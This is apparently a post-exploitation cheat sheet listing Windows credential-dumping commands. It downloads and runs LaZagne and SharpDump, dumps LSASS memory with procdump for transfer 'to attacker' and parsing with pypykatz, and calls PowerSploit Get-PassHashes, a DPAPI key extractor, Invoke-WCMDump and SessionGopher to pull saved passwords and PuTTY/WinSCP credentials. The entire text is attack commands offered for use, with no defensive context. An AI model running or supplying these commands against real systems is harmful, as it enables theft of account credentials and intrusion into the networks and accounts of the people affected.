# 1. LaZagne (extracts from multiple applications)
wget https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/LaZagne.exe
lazagne.exe all

# 2. SharpDump (dump LSASS)
wget https://github.com/GhostPack/SharpDump/releases/download/v1.0/SharpDump.exe
SharpDump.exe

# 3. Procdump + pypykatz
procdump64.exe -ma lsass.exe lsass.dmp
# Transfer to attacker, then:
pypykatz lsa minidump lsass.dmp

# 4. PowerSploit Get-PassHashes
Get-PassHashes

# 5. NCrypt (extract DPAPI keys)
NCrypt.exe

# 6. Invoke-WCMDump (extract saved credentials)
Invoke-WCMDump

# 7. SessionGopher (extract PuTTY/WinSCP creds)
Import-Module SessionGopher.ps1
Invoke-SessionGopher -Thorough